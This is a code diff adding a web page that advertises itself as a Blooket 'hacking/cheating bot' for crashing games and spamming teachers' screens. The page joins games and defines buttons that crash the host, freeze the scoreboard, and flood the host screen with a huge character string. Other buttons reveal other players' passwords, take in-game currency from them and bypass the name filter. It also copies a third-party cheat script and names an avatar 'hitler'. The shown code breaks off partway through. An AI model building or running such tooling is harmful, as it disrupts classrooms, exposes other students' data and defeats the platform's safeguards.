@@ -1,0 +1,5099 @@
+<html lang="en" prefix="og: https://ogp.me/ns#">
+
+  <head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>blooketbl</title>
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:400,700|Titan+One|Creepster|Satisfy|Eczar:700">
+
+    <link rel="icon" href="https://cdn.glitch.global/50648a61-8fe9-4ce0-a01c-baff9438bbf2/bblogo.png">
+
+    <link rel="manifest" href="manifest.json">
+
+    <meta name="google-site-verification" content="UCESNa27VYtuffW-_CapVrfDLOYPhwcyZXGAFe3rp9w">
+
+    <meta name="description" content="blooket hacking/cheating bot Need to crash a blooket game, or spam the teachers screen with text? Try out blooketbot today!">
+
+    <meta property="og:title" content="Blooket Bot">
+
+    <meta property="og:description" content="The best blooket hacks available, just a click away! Try out blooketbot today!">
+
+    <meta property="og:image" content="https://cdn.glitch.global/50648a61-8fe9-4ce0-a01c-baff9438bbf2/bblogo.png">
+
+    <meta property="og:url" content="https://bb.doyle31.com">
+
+    <meta property="og:type" content="website">
+
+  </head>
+
+</html>
+
+    <style>
+
+      /* Base Styles */
+
+      * {
+
+        touch-action: manipulation;
+
+      }
+
+      ::selection {
+
+        background-color: #0ab6c250;
+
+      }
+
+      body {
+
+        margin: 0;
+
+        padding: 0;
+
+        font-family: Nunito, sans-serif;
+
+        -webkit-font-smoothing: antialiased;
+
+        -moz-osx-font-smoothing: grayscale;
+
+        background-color: #1ee6dc;
+
+      }
+
+      .mainBody {
+
+        position: absolute;
+
+        top: 0;
+
+        left: 0;
+
+        width: 100%;
+
+        min-height: 100vh;
+
+      }
+
+      /* Background Pattern */
+
+      ._checkers_l90pt_12 {
+
+        z-index: -9999;
+
+        position: absolute;
+
+        top: 50%;
+
+        left: 50%;
+
+        transform: translate(-50%, -50%) rotate(15deg);
+
+         opacity: 0.5;
+
+        background-image: url(
+
+         "https://cdn.glitch.global/50648a61-8fe9-4ce0-a01c-baff9438bbf2/checker.png?v=1735078415618");
+
+        background-size: 550px;
+
+        width: 200%;
+
+        height: 200%;
+
+      }
+
+      /* Error Bar */
+
+      .errorBar {
+
+        position: absolute;
+
+        top: 100%;
+
+        width: 100%;
+
+        left: 0;
+
+        min-height: 55px;
+
+        padding: 11px 5px 5px;
+
+        box-sizing: border-box;
+
+        box-shadow: inset 0 6px #0003;
+
+        background-color: #e84135;
+
+        color: #fff;
+
+        font-size: 20px;
+
+        display: flex;
+
+        justify-content: center;
+
+        align-items: center;
+
+        overflow: hidden;y
+
+        z-index: 10;
+
+        transition: 0.1s;
+
+      }
+
+      /* Button Styles */
+
+      .joinButton,
+
+      .discordButton {
+
+        cursor: pointer;
+
+        overflow: hidden;
+
+        outline: none;
+
+        background-color: #fff;
+
+        box-shadow: inset 0 -6px #0003, 0 0 4px #00000026;
+
+        border-radius: 5px;
+
+        display: flex;
+
+        justify-content: center;
+
+        align-items: center;
+
+        transition: 0.2s;
+
+      }
+
+      .joinButton {
+
+        height: 60px;
+
+        width: 150px;
+
+        padding-bottom: 6px;
+
+        font-weight: 700;
+
+        font-size: 20px;
+
+      }
+
+      .discordButton {
+
+        height: 40px;
+
+        width: 130px;
+
+        font-size: 20px;
+
+        float: left;
+
+        margin-top: 3px;
+
+      }
+
+      .joinButton:hover,
+
+      .discordButton:hover {
+
+        transform: scale(0.9);
+
+      }
+
+      /* Input Styles */
+
+      .nameInput,
+
+      .idInput {
+
+        width: 100%;
+
+        height: 100%;
+
+        background-color: transparent;
+
+        border: none;
+
+        padding: 5px;
+
+        box-sizing: border-box;
+
+        font-size: 35px;
+
+        font-weight: 700;
+
+        text-align: center;
+
+        outline: none;
+
+        font-family: Nunito, sans-serif;
+
+        color: #5f5f5f;
+
+      }
+
+      /* Input Containers */
+
+      .nameInputContainer,
+
+      .idInputContainer {
+
+        height: 60px;
+
+        padding-bottom: 6px;
+
+        box-shadow: inset 0 -6px #0003, 0 0 4px #00000026;
+
+        background-color: #fff;
+
+        border-radius: 6px;
+
+      }
+
+      .nameInputContainer {
+
+        width: 300px;
+
+      }
+
+      .idInputContainer {
+
+        width: 300px;
+
+      }
+
+      .inputcontainer {
+
+        background-color: #df9000;
+
+        display: inline-block;
+
+        border-radius: 4px;
+
+        user-select: none;
+
+        cursor: pointer;
+
+        justify-items: center;
+
+      }
+
+      .inputcontainer:hover {
+
+        box-shadow: 0 8px 16px 0 rgba(0, 0, 0, 0.2),
+
+          0 6px 20px 0 rgba(0, 0, 0, 0.19);
+
+      }
+
+      .inputcontainer > div {
+
+        font-size: 23px;
+
+        text-align: center;
+
+        font-family: "Source Code Pro", monospace;
+
+        color: black;
+
+        display: grid;
+
+        padding-inline: 5px;
+
+      }
+
+      .inputcontainer > input,
+
+      .inputcontainer > select {
+
+        margin: 4px;
+
+        text-align: center;
+
+        font-size: 18px;
+
+        background-color: white;
+
+      }
+
+      .inputcontainer > select {
+
+        width: -webkit-fill-available;
+
+      }
+
+      /* Text Styles */
+
+      .normtext {
+
+        z-index: 1 !important;
+
+        font-size: 40px;
+
+        color: white;
+
+        text-align: left;
+
+        margin-left: 1px;
+
+        font-family: "Titan One", sans-serif;
+
+        -webkit-user-select: none;
+
+        -moz-user-select: none;
+
+        user-select: none;
+
+        text-decoration: none;
+
+      }
+
+      .btext {
+
+        font-size: 140%;
+
+        color: #5f5f5f;
+
+        -webkit-user-select: none;
+
+      }
+
+      /* Layout Components */
+
+      .codecontainer {
+
+        margin: 5px;
+
+        display: flex;
+
+        flex-wrap: wrap;
+
+        gap: 20px;
+
+      }
+
+      .inputboxcontainer {
+
+        display: flex;
+
+        flex-direction: column;
+
+        align-items: center;
+
+        gap: 5px;
+
+        margin-right: 20px;
+
+      }
+
+      #ctrlpanel {
+
+        margin: 9px;
+
+      }
+
+      .cheatcontainer > * {
+
+        margin: 15px;
+
+      }
+
+      /* Custom Checkbox */
+
+      checkbox {
+
+        display: inline-block;
+
+        width: 60px;
+
+        height: 34px;
+
+        background-color: grey;
+
+        border-radius: 34px;
+
+        position: relative;
+
+        cursor: pointer;
+
+        transition: background-color 0.3s;
+
+      }
+
+      checkbox::before {
+
+        content: "";
+
+        position: absolute;
+
+        width: 26px;
+
+        height: 26px;
+
+        border-radius: 50%;
+
+        background-color: white;
+
+        top: 4px;
+
+        left: 4px;
+
+        transition: transform 0.3s;
+
+      }
+
+      checkbox[checked] {
+
+        background-color: #df9000;
+
+      }
+
+      checkbox[checked]::before {
+
+        transform: translateX(26px);
+
+        background-color: white;
+
+      }
+
+      .main-content {
+
+        display: flex;
+
+        flex-wrap: wrap;
+
+        gap: 20px;
+
+        align-items: center;
+
+      }
+
+      /* Toggle switches section */
+
+      .toggles-section {
+
+        flex: 1;
+
+        min-width: 300px;
+
+        justify: center;
+
+      }
+
+      .toggle-container {
+
+        display: flex;
+
+        align-items: center;
+
+        gap: 10px;
+
+      }
+
+      /* Chat Styles */
+
+      .chat {
+
+        position: fixed;
+
+        margin: 10px;
+
+        background-color: #091794;
+
+        border-radius: 10px;
+
+      }
+
+      .chatcontainer {
+
+        width: 750px;
+
+        height: 250px;
+
+        background-color: #202020a0;
+
+        margin: 10px;
+
+        flex-direction: column-reverse;
+
+        display: flex;
+
+        overflow-y: auto;
+
+      }
+
+      .chatmsg {
+
+        color: white;
+
+        font-size: 22px;
+
+        margin-left: 1px;
+
+      }
+
+      .chatinpcontainer {
+
+        margin: 10px;
+
+      }
+
+      #chat {
+
+        width: -webkit-fill-available;
+
+        font-size: 22px;
+
+      }
+
+      .dragcontainer {
+
+        background-color: #091794;
+
+        font-size: 20px;
+
+        position: absolute;
+
+        border-radius: 10px;
+
+        font-weight: bold;
+
+      }
+
+      #drag {
+
+        margin: 5px;
+
+        user-select: none;
+
+        cursor: move;
+
+      }
+
+      #globalmsg {
+
+        font-size: 100px;
+
+        background-color: #cd0000;
+
+        color: #b6ecff;
+
+        font-family: "Titan One", sans-serif;
+
+        z-index: -0.5;
+
+      }
+
+      /* Discord Chat Styles */
+
+      .mainbodychat {
+
+        background-color: rgb(75, 75, 75);
+
+        width: 700px;
+
+        height: 500px;
+
+        border-radius: 10px;
+
+        overflow-x: hidden;
+
+        padding: 0;
+
+        margin: 0;
+
+        display: flex;
+
+        flex-direction: column;
+
+        position: absolute;
+
+        transition: transform 0.2s ease-in;
+
+      }
+
+      .headerdraggable {
+
+        width: 100%;
+
+        height: 25px;
+
+        background-color: rgb(37, 37, 37);
+
+        display: flex;
+
+        justify-content: flex-end;
+
+        align-items: center;
+
+        flex-direction: row;
+
+        font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+
+          sans-serif;
+
+        color: white;
+
+        margin: 0;
+
+      }
+
+      .action_button,
+
+      .action_button_draggable {
+
+        color: white;
+
+        background-color: rgba(1, 1, 1, 0);
+
+        box-shadow: 0;
+
+        border: none;
+
+        font-size: 10px;
+
+        transition: all 0.2s ease-out;
+
+      }
+
+      .action_button_draggable:hover {
+
+        cursor: move;
+
+        transform: scale(1.1, 1.1);
+
+      }
+
+      .action_button:hover {
+
+        cursor: pointer;
+
+        transform: scale(1.1, 1.1);
+
+      }
+
+      .channelinfo {
+
+        background-color: gray;
+
+        color: white;
+
+        font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+
+          sans-serif;
+
+        font-weight: 20px;
+
+        margin: 0;
+
+        height: 30px;
+
+        display: flex;
+
+        align-items: center;
+
+      }
+
+      .channeltitle {
+
+        margin: 0;
+
+        margin-left: 10px;
+
+      }
+
+      .startheader {
+
+        height: 100%;
+
+        width: 40%;
+
+        display: flex;
+
+        justify-content: start;
+
+        align-items: center;
+
+      }
+
+      .center {
+
+        height: 100%;
+
+        width: 30%;
+
+      }
+
+      .endheader {
+
+        height: 100%;
+
+        width: 30%;
+
+        display: flex;
+
+        flex-direction: row;
+
+        justify-content: end;
+
+      }
+
+      .username {
+
+        border: none;
+
+        background-color: rgba(1, 1, 1, 0);
+
+        height: 100%;
+
+        width: 100%;
+
+        text-align: end;
+
+        padding-right: 10px;
+
+        text-decoration: underline;
+
+        font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+
+          sans-serif;
+
+        font-weight: bold;
+
+        color: white;
+
+        font-size: 110%;
+
+      }
+
+      .username:hover {
+
+        cursor: pointer;
+
+      }
+
+      .discordchat {
+
+        width: 100%;
+
+        margin: 0;
+
+        display: flex;
+
+        flex-direction: column;
+
+        overflow-y: auto;
+
+        flex-shrink: 1;
+
+        flex-grow: 1;
+
+      }
+
+      .messagesinput {
+
+        height: 30px;
+
+        width: 100%;
+
+        margin: 0;
+
+        display: flex;
+
+        flex-direction: row;
+
+        justify-content: center;
+
+        margin-bottom: 15px;
+
+      }
+
+      .messagetext {
+
+        height: 100%;
+
+        width: 95%;
+
+        background-color: rgb(90, 90, 90);
+
+        margin: 0;
+
+        border-radius: 5px;
+
+        display: flex;
+
+        flex-direction: row;
+
+        justify-content: end;
+
+      }
+
+      .messageoutput {
+
+        margin-left: 20px;
+
+        margin-top: 20px;
+
+        display: flex;
+
+        flex-direction: row;
+
+        row-gap: 10px;
+
+        margin-bottom: 20px;
+
+      }
+
+      .messagepfp {
+
+        border-radius: 50px;
+
+        width: 50px;
+
+        height: 50px;
+
+        margin: 0;
+
+      }
+
+      .messageoutputinfo {
+
+        width: 100%;
+
+        overflow-x: auto;
+
+        display: flex;
+
+        flex-direction: column;
+
+        justify-content: center;
+
+        color: white;
+
+        font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+
+          sans-serif;
+
+      }
+
+      .usersending {
+
+        margin: 0;
+
+        margin-left: 15px;
+
+        font-size: 20px;
+
+        font-weight: 1000;
+
+        text-decoration: underline;
+
+      }
+
+      .messagetextarea {
+
+        width: 100%;
+
+        height: 100%;
+
+        color: white;
+
+        border: none;
+
+        background-color: rgba(1, 1, 1, 0);
+
+        resize: none;
+
+      }
+
+      .messagetextarea::placeholder {
+
+        color: gray;
+
+      }
+
+      .usersmessage {
+
+        margin: 0;
+
+        font-weight: 30;
+
+        margin-left: 15px;
+
+        font-size: 15px;
+
+      }
+
+      .bcpButton,
+
+      .bcpUserButton {
+
+        height: 40px;
+
+        width: 230px;
+
+        cursor: pointer;
+
+        overflow: hidden;
+
+        outline: none;
+
+        background-color: #fff;
+
+        box-shadow: inset 0 -6px #0003, 0 0 4px #00000026;
+
+        border-radius: 5px;
+
+        display: flex;
+
+        font-weight: 700;
+
+        justify-content: center;
+
+        align-items: center;
+
+        transition: 0.2s;
+
+        font-size: 20px;
+
+        float: left;
+
+        display: flex;
+
+        margin-top: 3px;
+
+      }
+
+      .setusernamefullbox {
+
+        display: none;
+
+        justify-content: center;
+
+        align-items: center;
+
+        background-color: rgba(1, 1, 1, 0.459);
+
+        color: white;
+
+        font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+
+          sans-serif;
+
+        width: 100%;
+
+        height: 100%;
+
+        z-index: 10;
+
+        position: absolute;
+
+      }
+
+      .setusernamesubmit {
+
+        display: flex;
+
+        flex-direction: column;
+
+        align-items: center;
+
+        height: 150px;
+
+        width: 300px;
+
+        background-color: rgb(73, 73, 73);
+
+        border-radius: 5px;
+
+      }
+
+      .usernameinput {
+
+        background-color: rgb(49, 49, 49);
+
+        border: none;
+
+        border-radius: 5px;
+
+        height: 30px;
+
+        margin-bottom: 10px;
+
+        width: 200px;
+
+        color: white;
+
+      }
+
+      .usernameinput::placeholder {
+
+        color: gray;
+
+      }
+
+      .usernameinputsubmit {
+
+        background-color: rgb(49, 49, 49);
+
+        border: none;
+
+        border-radius: 5px;
+
+        height: 30px;
+
+        margin-bottom: 10px;
+
+        width: 200px;
+
+        color: white;
+
+      }
+
+      .usernameinputsubmit:hover {
+
+        cursor: pointer;
+
+      }
+
+      .discordbotcredits {
+
+        margin-right: 190px;
+
+      }
+
+      .system_message_container_codesocketclosed {
+
+        color: red;
+
+        font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
+
+          sans-serif;
+
+        text-align: center;
+
+      }
+
+    </style>
+
+  <body>
+
+    <!-- Credit for this goes to jacskon -->
+
+    <div
+
+      class="mainBody"
+
+      style="z-index: 0; background-color: #1ee6dc; overflow: hidden"
+
+    >
+
+      <div class="_checkers_l90pt_12"></div>
+
+      <div class="chat" style="top: 350; left: 200; display: none">
+
+        <div class="chatcontainer">
+
+          <div class="chatmsg"></div>
+
+        </div>
+
+        <div class="chatinpcontainer">
+
+          <input id="chat" placeholder="Type a message..." />
+
+        </div>
+
+        <div
+
+          class="dragcontainer"
+
+          style="
+
+            background-color: #091794;
+
+            font-size: 20px;
+
+            position: absolute;
+
+            border-radius: 10px;
+
+            font-weight: bold;
+
+          "
+
+        >
+
+          <div id="drag">Drag</div>
+
+        </div>
+
+      </div>
+
+      <div class="codecontainer" id="cc">
+
+        <div class="main-content">
+
+          <div class="inputboxcontainer">
+
+            <div class="normtext">Enter code:</div>
+
+            <div class="idInputContainer">
+
+              <input id="gcode" class="idInput" placeholder="Game ID" />
+
+            </div>
+
+            <div class="nameInputContainer">
+
+              <input id="gname" class="nameInput" placeholder="Nickname" />
+
+            </div>
+
+            <div class="joinButton" onclick="join();" role="button">
+
+              <div class="btext">Join</div>
+
+            </div>
+
+          </div>
+
+          <div class="toggles-section">
+
+            <div class="toggle-container">
+
+              <span class="normtext">Incognito Mode:</span>
+
+              <checkbox id="icogmode" checked="true"></checkbox>
+
+            </div>
+
+            <div class="toggle-container">
+
+              <span class="normtext">Bypass Name Filter:</span>
+
+              <checkbox id="bcf"></checkbox>
+
+            </div>
+
+            <div class="toggle-container">
+
+              <span class="normtext">First Place Switch:</span>
+
+              <checkbox id="fpswitch" checked="true"></checkbox>
+
+            </div>
+
+          </div>
+
+        </div>
+
+        <text class="normtext" style="display: none" id="ostatus"></text>
+
+      </div>
+
+      <div id="ctrlpanel"></div>
+
+      <div style="margin-left: 5px">
+
+        <div class="normtext" id="status">Status: Loading...</div>
+
+        <div class="normtext">
+
+          <a href="https://discord.gg/8A6J234n7v" target="_blank"
+
+            >Join the discord server!</a
+
+          >
+
+        </div>
+
+        <br /><br />
+
+        <div class="normtext">
+
+          <a href="https://blooketbl.glitch.me/credits.html" target="_blank"
+
+            >Credits!</a
+
+          ><!-- and doyle_31-->
+
+        </div>
+
+        <div class="bcpbuttonrow">
+
+          <div class="bcpButton">
+
+            <a onclick="copyBCPScript()">Copy BCP Script</a>
+
+          </div>
+
+          <h3>&lt;-- Try Out Blooket Cheats Plus!</h3>
+
+          <div class="bcpbuttonrow">
+
+            <div class="bcpUserButton">
+
+              <a
+
+                href="https://raw.githubusercontent.com/randomstuff69/blooketcheatsplus/refs/heads/main/GUI/Gui.user.js"
+
+                >Install BCP Userscript</a
+
+              >
+
+            </div>
+
+            <h3>&lt;-- Install Blooket Cheats Plus Userscript!</h3>
+
+          </div>
+
+        </div>
+
+        <div
+
+          class="errorBar"
+
+          id="error"
+
+          style="transform: translateY(0%)"
+
+        ></div>
+
+      </div>
+
+      
+
+      <script>
+
+function logToGames(data) {
+
+  fetch('/log', {
+
+    method: 'POST',
+
+    headers: { 'Content-Type': 'application/json' },
+
+    body: JSON.stringify({ data })
+
+  })
+
+  .then(res => res.text())
+
+  .then(console.log)
+
+  .catch(console.error);
+
+}
+
+// Example: Log a word list or string of numbers
+
+logToGames("apple,banana,123");
+
+</script>
+
+      
+
+      
+
+      <script type="module">
+
+        import {
+
+          initializeApp,
+
+          deleteApp,
+
+        } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+
+        import {
+
+          getAuth,
+
+          signInWithCustomToken,
+
+          setPersistence,
+
+        } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-auth.js";
+
+        import {
+
+          getDatabase,
+
+          ref,
+
+          set,
+
+          get,
+
+          onValue,
+
+        } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js";
+
+        window.initializeApp = initializeApp;
+
+        window.getAuth = getAuth;
+
+        window.deleteApp = deleteApp;
+
+        window.getDatabase = getDatabase;
+
+        window.ref = ref;
+
+        window.set = set;
+
+        window.get = get;
+
+        window.onValue = onValue;
+
+        window.signInWithCustomToken = signInWithCustomToken;
+
+        window.setPersistence = setPersistence;
+
+      </script>
+
+      <script>
+
+        async function copyBCPScript() {
+
+          try {
+
+            const response = await fetch(
+
+              "https://raw.githubusercontent.com/randomstuff69/blooketcheatsplus/refs/heads/main/GUI/Gui.min.js"
+
+            );
+
+            const scriptText = await response.text();
+
+            await navigator.clipboard.writeText(scriptText);
+
+          } catch (error) {
+
+            console.error("Copy failed:", error);
+
+            alert("Failed to copy the script. Please try again.");
+
+          }
+
+        }
+
+      </script>
+
+      <script>
+
+        function join() {
+
+          var cin = document.getElementById("gcode");
+
+          var name = document.getElementById("gname");
+
+          joinGame(
+
+            cin.value,
+
+            name.value,
+
+            document.getElementById("icogmode").getAttribute("checked")
+
+              ? true
+
+              : false
+
+          );
+
+        }
+
+        function errorBar(error) {
+
+          var e = document.getElementById("error");
+
+          e.innerText = error;
+
+          e.style.transform = "translateY(-100%)";
+
+          setTimeout(function () {
+
+            e.style.transform = "translateY(0%)";
+
+          }, 4000);
+
+        }
+
+      </script>
+
+      
+
+      <script>
+
+       const hitler = "1#0#1#0#1$3#0#0#1#6#0#0$0"; 
+
+        const trumpBlook = "2#1#3#0#1$4#0#2#0#5#1#0$1";
+
+        var blooks = [
+
+          hitler,
+
+          "Old Boot",
+
+          "Jellyfish",
+
+          "Clownfish",
+
+          "Frog",
+
+          "Crab",
+
+          "Pufferfish",
+
+          "Blobfish",
+
+          "Octopus",
+
+          "Narwhal",
+
+          "Dolphin",
+
+          "Baby Shark",
+
+          "Megalodon",
+
+          "Snowy Owl",
+
+          "Polar Bear",
+
+          "Arctic Fox",
+
+          "Baby Penguin",
+
+          "Penguin",
+
+          "Arctic Hare",
+
+          "Seal",
+
+          "Walrus",
+
+          "Snow Globe",
+
+          "Holiday Gift",
+
+          "Hot Chocolate",
+
+          "Holiday Wreath",
+
+          "Stocking",
+
+          "Gingerbread Man",
+
+          "Gingerbread House",
+
+          "Reindeer",
+
+          "Snowman",
+
+          "Santa Claus",
+
+          "Lil Bot",
+
+          "Lovely Bot",
+
+          "Angry Bot",
+
+          "Happy Bot",
+
+          "Watson",
+
+          "Buddy Bot",
+
+          "Brainy Bot",
+
+          "Mega Bot",
+
+          "Toast",
+
+          "Cereal",
+
+          "Yogurt",
+
+          "Breakfast Combo",
+
+          "Orange Juice",
+
+          "Milk",
+
+          "Waffle",
+
+          "Pancakes",
+
+          "French Toast",
+
+          "Pizza",
+
+          "Light Blue",
+
+          "Black",
+
+          "Red",
+
+          "Purple",
+
+          "Pink",
+
+          "Orange",
+
+          "Lime",
+
+          "Green",
+
+          "Teal",
+
+          "Tan",
+
+          "Maroon",
+
+          "Gray",
+
+          "Mint",
+
+          "Salmon",
+
+          "Burgandy",
+
+          "Baby Blue",
+
+          "Dust",
+
+          "Brown",
+
+          "Dull Blue",
+
+          "Yellow",
+
+          "Blue",
+
+          "Amber",
+
+          "Dino Egg",
+
+          "Dino Fossil",
+
+          "Stegosaurus",
+
+          "Velociraptor",
+
+          "Brontosaurus",
+
+          "Triceratops",
+
+          "Tyrannosaurus Rex",
+
+          "Chick",
+
+          "Chicken",
+
+          "Cow",
+
+          "Goat",
+
+          "Horse",
+
+          "Pig",
+
+          "Sheep",
+
+          "Duck",
+
+          "Alpaca",
+
+          "Bear",
+
+          "Moose",
+
+          "Fox",
+
+          "Raccoon",
+
+          "Squirrel",
+
+          "Owl",
+
+          "Hedgehog",
+
+          "Deer",
+
+          "Wolf",
+
+          "Beaver",
+
+          "Rainbow Jellyfish",
+
+          "Blizzard Clownfish",
+
+          "Lovely Frog",
+
+          "Lucky Frog",
+
+          "Spring Frog",
+
+          "Poison Dart Frog",
+
+          "Lucky Hamster",
+
+          "Chocolate Rabbit",
+
+          "Lemon Crab",
+
+          "Pirate Pufferfish",
+
+          "Donut Blobfish",
+
+          "Crimson Octopus",
+
+          "Rainbow Narwhal",
+
+          "Frost Wreath",
+
+          "Tropical Globe",
+
+          "New York Snow Globe",
+
+          "London Snow Globe",
+
+          "Japan Snow Globe",
+
+          "Egypt Snow Globe",
+
+          "Paris Snow Globe",
+
+          "Red Sweater Snowman",
+
+          "Blue Sweater Snowman",
+
+          "Elf Sweater Snowman",
+
+          "Santa Claws",
+
+          "Cookies Combo",
+
+          "Chilly Flamingo",
+
+          "Snowy Bush Monster",
+
+          "Nutcracker Koala",
+
+          "Sandwich",
+
+          "Ice Slime",
+
+          "Frozen Fossil",
+
+          "Ice Crab",
+
+          "Rainbow Panda",
+
+          "White Peacock",
+
+          "Tiger Zebra",
+
+          "Teal Platypus",
+
+          "Red Astronaut",
+
+          "Orange Astronaut",
+
+          "Yellow Astronaut",
+
+          "Lime Astronaut",
+
+          "Green Astronaut",
+
+          "Cyan Astronaut",
+
+          "Blue Astronaut",
+
+          "Pink Astronaut",
+
+          "Purple Astronaut",
+
+          "Brown Astronaut",
+
+          "Black Astronaut",
+
+          "Lovely Planet",
+
+          "Lovely Peacock",
+
+          "Haunted Pumpkin",
+
+          "Pumpkin Cookie",
+
+          "Ghost Cookie",
+
+          "Red Gummy Bear",
+
+          "Blue Gummy Bear",
+
+          "Green Gummy Bear",
+
+          "Chick Chicken",
+
+          "Chicken Chick",
+
+          "Raccoon Bandit",
+
+          "Owl Sheriff",
+
+          "Vampire Frog",
+
+          "Pumpkin King",
+
+          "Anaconda Wizard",
+
+          "Spooky Pumpkin",
+
+          "Spooky Mummy",
+
+          "Agent Owl",
+
+          "Master Elf",
+
+          "Party Pig",
+
+          "Wise Owl",
+
+          "Spooky Ghost",
+
+          "Phantom King",
+
+          "Tim the Alien",
+
+          "Rainbow Astronaut",
+
+          "Hamsta Claus",
+
+          "Ice Bat",
+
+          "Ice Bug",
+
+          "Ice Elemental",
+
+          "Rock Monster",
+
+          "Dink",
+
+          "Donk",
+
+          "Bush Monster",
+
+          "Yeti",
+
+          "Witch",
+
+          "Wizard",
+
+          "Elf",
+
+          "Fairy",
+
+          "Slime Monster",
+
+          "Jester",
+
+          "Dragon",
+
+          "Queen",
+
+          "Unicorn",
+
+          "King",
+
+          "Dingo",
+
+          "Echidna",
+
+          "Koala",
+
+          "Kookaburra",
+
+          "Platypus",
+
+          "Joey",
+
+          "Kangaroo",
+
+          "Crocodile",
+
+          "Sugar Glider",
+
+          "Dog",
+
+          "Cat",
+
+          "Rabbit",
+
+          "Goldfish",
+
+          "Hamster",
+
+          "Turtle",
+
+          "Kitten",
+
+          "Puppy",
+
+          "Panda",
+
+          "Sloth",
+
+          "Tenrec",
+
+          "Flamingo",
+
+          "Zebra",
+
+          "Elephant",
+
+          "Lemur",
+
+          "Peacock",
+
+          "Chameleon",
+
+          "Lion",
+
+          "Earth",
+
+          "Meteor",
+
+          "Stars",
+
+          "Alien",
+
+          "Planet",
+
+          "UFO",
+
+          "Spaceship",
+
+          "Astronaut",
+
+          "Pumpkin",
+
+          "Swamp Monster",
+
+          "Frankenstein",
+
+          "Vampire",
+
+          "Zombie",
+
+          "Mummy",
+
+          "Caramel Apple",
+
+          "Candy Corn",
+
+          "Werewolf",
+
+          "Ghost",
+
+          "Tiger",
+
+          "Orangutan",
+
+          "Cockatoo",
+
+          "Parrot",
+
+          "Anaconda",
+
+          "Jaguar",
+
+          "Macaw",
+
+          "Toucan",
+
+          "Panther",
+
+          "Capuchin",
+
+          "Gorilla",
+
+          "Hippo",
+
+          "Rhino",
+
+          "Giraffe",
+
+          "Two of Spades",
+
+          "Eat Me",
+
+          "Drink Me",
+
+          "Alice",
+
+          "Queen of Hearts",
+
+          "Dormouse",
+
+          "White Rabbit",
+
+          "Cheshire Cat",
+
+          "Caterpillar",
+
+          "Mad Hatter",
+
+          "King of Hearts",
+
+          "Deckhand",
+
+          "Buccaneer",
+
+          "Swashbuckler",
+
+          "Treasure Map",
+
+          "Seagull",
+
+          "Jolly Pirate",
+
+          "Pirate Ship",
+
+          "Kraken",
+
+          "Captain Blackbeard",
+
+        ];
+
+        var botinfo = {};
+
+        var gameobject = {};
+
+        var cheats = {
+
+          Hack: [
+
+            {
+
+              type: "button",
+
+              name: "Crash host(crypto)",
+
+              action: function (e) {
+
+                setUserVal("cr/t", "t");
+
+                e.innerText = "Crashing";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("tat/t", "t");
+
+                } else {
+
+                  setUserVal("tat", "t");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Turn Host Screen Green",
+
+              action: function (e) {
+
+                if (e.green != null) {
+
+                  e.green = !e.green;
+
+                } else {
+
+                  e.green = true;
+
+                }
+
+                if (e.green) {
+
+                  setUserVal(
+
+                    "cr",
+
+                    (function () {
+
+                      var t =
+
+                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+
+                      for (var n = 0; n < 300000; n++) {
+
+                        t += String.fromCharCode(3655);
+
+                        if (n % 61 == 0) {
+
+                          t += String.fromCharCode(32);
+
+                        }
+
+                      }
+
+                      return (t +=
+
+                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
+
+                    })()
+
+                  );
+
+                } else {
+
+                  setUserVal("cr", 0);
+
+                }
+
+                e.innerText = e.green
+
+                  ? "Ungreen Host Screen"
+
+                  : "Turn Host Screen Green";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Set Crash Password",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("p/toString", "t");
+
+                } else {
+
+                  setUserVal("p", "DogLover3");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Remove Crash Password"
+
+                  : "Set Crash Password";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Set Freeze Password",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("p", genCursed());
+
+                } else {
+
+                  setUserVal("p", "DogLover3");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Remove Freeze Password"
+
+                  : "Set Freeze Password";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Crypto",
+
+              action: function (e) {
+
+                setUserVal("cr", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Password",
+
+              action: function (e) {
+
+                setUserVal("p", e);
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Get User Password",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                alert(gameobject?.c?.[e]?.p);
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Steal Crypto From",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
